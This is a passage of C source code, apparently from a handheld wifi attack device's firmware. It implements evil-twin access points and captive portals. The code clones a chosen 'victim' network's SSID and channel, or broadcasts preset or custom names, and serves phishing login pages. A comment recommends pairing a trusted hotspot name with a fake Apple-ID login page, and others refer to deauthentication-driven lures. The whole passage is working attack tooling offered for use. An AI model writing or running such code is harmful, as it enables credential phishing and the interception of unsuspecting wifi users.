     * the AP will advertise. Mixing them is the killer combo —
     * e.g. broadcast "xfinitywifi" but serve an Apple-ID login page. */
    s_current_html = s_templates[t].html;
    int src = pick_source(SSID_SRC_OPTS, SSID_SRC__COUNT, "BROADCAST AS");
    if (src < 0) return;

    switch (src) {
        case SSID_SRC_TEMPLATE:
            strncpy(s_portal_ssid, s_templates[t].name, sizeof(s_portal_ssid) - 1);
            s_portal_ssid[sizeof(s_portal_ssid) - 1] = '\0';
            break;

        case SSID_SRC_PRESET: {
            int p = pick_string_list(PRESET_SSIDS, (int)PRESET_SSIDS_N,
                                     "PRESET SSID");
            if (p < 0) return;
            strncpy(s_portal_ssid, PRESET_SSIDS[p], sizeof(s_portal_ssid) - 1);
            s_portal_ssid[sizeof(s_portal_ssid) - 1] = '\0';
            break;
        }

        case SSID_SRC_CLONE:
            if (!g_last_selected_valid) {
                ui_toast("scan + pick AP first", T_WARN, 1500);
                return;
            }
            strncpy(s_portal_ssid, g_last_selected_ap.ssid, sizeof(s_portal_ssid) - 1);
            s_portal_ssid[sizeof(s_portal_ssid) - 1] = '\0';
            /* Bug 11: match the victim's channel for the clone variant
             * too — same reasoning as feat_wifi_apclone. */
            s_portal_channel = g_last_selected_ap.channel;
            break;

        case SSID_SRC_CUSTOM: {
            char buf[33] = {0};
            if (!input_line("AP SSID:", buf, sizeof(buf))) return;
            if (buf[0] == '\0') return;
            strncpy(s_portal_ssid, buf, sizeof(s_portal_ssid) - 1);
            s_portal_ssid[sizeof(s_portal_ssid) - 1] = '\0';
            break;
        }

        default:
            return;
    }

    run_portal();
}

/* AP Clone = portal with victim AP's SSID. */
void feat_wifi_apclone(void)
{
    radio_switch(RADIO_WIFI);
    if (!g_last_selected_valid) {
        ui_toast("scan + select AP first", T_WARN, 1500);
        return;
    }
    /* POS-AUDIT-213 / wifi-041: same PMF caveat as portal quick-clone
     * — deauth-driven lure won't work, surface the warning. */
    if (wifi_auth_has_pmf(g_last_selected_ap.auth) && !wifi_pmf_warning()) return;
    strncpy(s_portal_ssid, g_last_selected_ap.ssid, sizeof(s_portal_ssid) - 1);
    s_portal_ssid[sizeof(s_portal_ssid) - 1] = '\0';
    /* Bug 11: match the victim's channel so clients tracking that
     * SSID on ch6/11 actually see our clone. ch1 hardcode used to
     * leave the clone on a different channel from the target — that
     * was the "weak signal" the user reported. */
    s_portal_channel = g_last_selected_ap.channel;
    s_current_html = HTML_FREEWIFI;
    run_portal();
}
